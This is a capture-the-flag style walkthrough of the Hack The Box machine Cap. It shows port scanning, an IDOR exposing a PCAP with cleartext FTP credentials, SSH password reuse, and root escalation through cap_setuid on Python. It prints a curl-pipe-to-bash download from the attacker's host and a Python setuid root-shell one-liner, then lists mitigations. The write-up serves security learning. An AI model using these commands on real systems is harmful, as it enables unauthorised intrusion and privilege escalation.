---
title: "HTB Walkthrough: Cap"
date: 2026-04-14
draft: false
description: "Full walkthrough of the Cap machine from Hack The Box. Easy difficulty, Linux (Ubuntu 20.04 LTS). IDOR on a PCAP download endpoint, cleartext FTP credentials, and privilege escalation via Linux Capability cap_setuid on Python 3.8."
tags: ["HackTheBox", "Linux", "Easy", "IDOR", "FTP", "PCAP", "Wireshark", "LinuxCapabilities", "cap_setuid", "PrivEsc", "cap", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Cap** on Hack The Box. **Easy** difficulty machine running **Linux (Ubuntu 20.04 LTS)**. We exploit an IDOR on a network capture download endpoint to obtain cleartext FTP credentials, gain SSH access by reusing the password, and escalate to root by abusing the `cap_setuid` capability assigned to the Python 3.8 binary.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                           |
|----------------|------------------------------------------------------------------|
| **Name**       | Cap                                                              |
| **OS**         | Linux (Ubuntu 20.04 LTS)                                         |
| **Difficulty** | Easy                                                             |
| **IP**         | 10.129.19.177                                                    |
| **Techniques** | IDOR · FTP Cleartext · Credential Reuse · Linux cap_setuid       |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.19.177
```

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Version scan on open ports:

```bash
nmap -sC -sV -p21,22,80 10.129.19.177
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
```

*Open ports:*
- `21` → vsftpd 3.0.3 (anonymous access disabled — credentials required)
- `22` → OpenSSH 8.2p1 (available for later access)
- `80` → Python web application (Gunicorn) with a "Security Dashboard"

> **💡 Key detail:** Gunicorn is a Python WSGI server — the web app is written in Python. Combined with FTP having no anonymous access, the initial vector likely goes through the web.

### 1.2 Web Enumeration — Security Dashboard

The application exposes a security dashboard with several sections:

- **Dashboard** — Real-time security event metrics.
- **Security Snapshot** — Generates and downloads a 5-second PCAP capture of the server's network traffic.
- **IP Config** — Shows the server's `ifconfig` output.
- **Network Status** — Network status.

The most interesting section is **Security Snapshot**. When clicking the download button, the generated URL is:

```
http://10.129.19.177/data/1
```

The number at the end is a **sequential numeric ID** identifying the capture. The current capture (ID=1) shows all zeros — it was generated on the spot and contains no prior traffic.

We try **ID=0**, the oldest capture on the server:

```
http://10.129.19.177/data/0
```

The response shows real data: 72 packets captured, 69 TCP. The server serves the capture without verifying it belongs to our user.

> **💡 IDOR (Insecure Direct Object Reference):** The application uses predictable IDs and doesn't validate that the requested resource belongs to the authenticated user. Simply changing the number in the URL gives us access to other users' or system captures.

---

## 2. Exploitation — IDOR and PCAP Analysis

### 2.1 Vulnerability Analysis

The `/data/<id>` endpoint delivers the corresponding PCAP file by ID without any authorization check. Since IDs are sequential integers starting at 0, we can iterate from zero to find captures with real traffic generated before our session.

```
Normal flow:    user generates capture → receives /data/<their_id>
Malicious flow: attacker requests /data/0 → receives someone else's capture with real traffic
```

### 2.2 Credential Extraction with Wireshark

We download the PCAP from ID=0 and open it in Wireshark. We filter by FTP protocol:

```
Wireshark filter: ftp
```

FTP transmits credentials in cleartext with no encryption. In the captured traffic we see the complete authentication exchange:

```
→ Request:  USER nathan
← Response: 331 Please specify password
→ Request:  PASS Buck3tH4TF0RM3!
← Response: 230 Login successful
```

> **🔑 Credentials obtained:** `nathan:Buck3tH4TF0RM3!`

---

## 3. User Flag

The FTP credentials are a direct candidate for SSH via password reuse — using the same password across multiple services on the same system is a very common mistake:

```bash
ssh nathan@10.129.19.177
# Password: Buck3tH4TF0RM3!
```

```
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
nathan@cap:~$
```

```bash
nathan@cap:~$ cat user.txt
```

> 🔑 User flag obtained.

---

## 4. Privilege Escalation — Linux Capability `cap_setuid`

### 4.1 System Enumeration

```bash
nathan@cap:~$ sudo -l
Sorry, user nathan may not run sudo on cap.

nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
```

No sudo. We run LinPEAS to look for escalation vectors:

```bash
# On the attacking machine
python3 -m http.server 8000

# On the victim machine
curl -L http://10.10.15.237/linpeas.sh | bash
```

LinPEAS detects something critical in the **Linux Capabilities** section:

```
Files with capabilities:
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

### 4.2 Escalation Vector Analysis

**Linux Capabilities** are a kernel mechanism that breaks down root privileges into smaller, more granular units. Instead of granting full root access, only the specific capability a process needs can be assigned. The problem arises when that capability is too powerful.

The **`cap_setuid`** capability allows the process to **change its effective UID to any value**, including 0 (root). Since it's assigned to the `/usr/bin/python3.8` binary, any Python script executed with that interpreter can call `os.setuid(0)` and become root.

We can find all binaries with capabilities on the system with:

```bash
getcap -r / 2>/dev/null
```

> **💡 Difference from SUID bit:** A binary with SUID always executes with the owner's UID. Capabilities are more granular, but `cap_setuid` is equally dangerous — in practice, both allow escalation to root if the binary is a script interpreter like Python.

### 4.3 Exploitation

The exploit reduces to two lines of Python: change the effective UID to 0 and open a shell in that context.

```bash
nathan@cap:~$ python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

```
root@cap:~# id
uid=0(root) gid=1000(nathan) groups=1000(nathan)
```

✅ **Root shell obtained via `cap_setuid` on Python 3.8.**

---

## 5. Root Flag

```bash
root@cap:~# cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 6. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Port 80 with Security Dashboard (Gunicorn/Python); FTP with no anonymous access.
2. **IDOR** → Endpoint `/data/0` serves someone else's PCAP without checking authorization.
3. **PCAP analysis** → Wireshark filters FTP traffic → credentials `nathan:Buck3tH4TF0RM3!` in cleartext.
4. **Foothold** → SSH with reused credentials → `user.txt`.
5. **PrivEsc** → LinPEAS detects `cap_setuid` on `/usr/bin/python3.8` → `os.setuid(0)` → shell as root → `root.txt`.

**What I learned from this machine:**

- **IDOR is a logic vulnerability, not a technology one.** It requires no complex exploit — just changing a number in the URL. The defense isn't complex either: verify server-side that the requested resource belongs to the authenticated user before serving it. What makes IDOR dangerous is how invisible it is without an active code review.

- **FTP transmits credentials in cleartext — always.** There's no encrypted mode in standard FTP. Any network traffic capture containing an FTP session will have the credentials directly readable. The alternative is SFTP (SSH File Transfer Protocol) or FTPS (FTP over TLS), which encrypt the full communication.

- **Password reuse across services on the same system is a risk multiplier.** A compromised FTP credential became SSH access. Basic policy: each service must have independent credentials.

- **`cap_setuid` on a script interpreter is equivalent to root.** Unlike a compiled binary where the control flow is fixed, an interpreter like Python executes arbitrary code. Assigning `cap_setuid` to Python effectively gives root to any user who can execute Python scripts — capabilities are only safe on binaries with very restricted functionality.

- **LinPEAS and capability enumeration are mandatory steps in Linux PrivEsc.** The usual checks (sudo, SUID, cron) don't cover capabilities. `getcap -r / 2>/dev/null` should always be part of the post-access enumeration checklist.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| IDOR on `/data/<id>` | Verify server-side that the requested ID belongs to the authenticated user before serving the file |
| FTP in cleartext | Replace FTP with SFTP or FTPS; never transmit credentials unencrypted |
| Password reuse | Unique credentials policy per service; use a password manager |
| `cap_setuid` on Python 3.8 | Remove the capability: `setcap -r /usr/bin/python3.8`; audit regularly with `getcap -r /` |
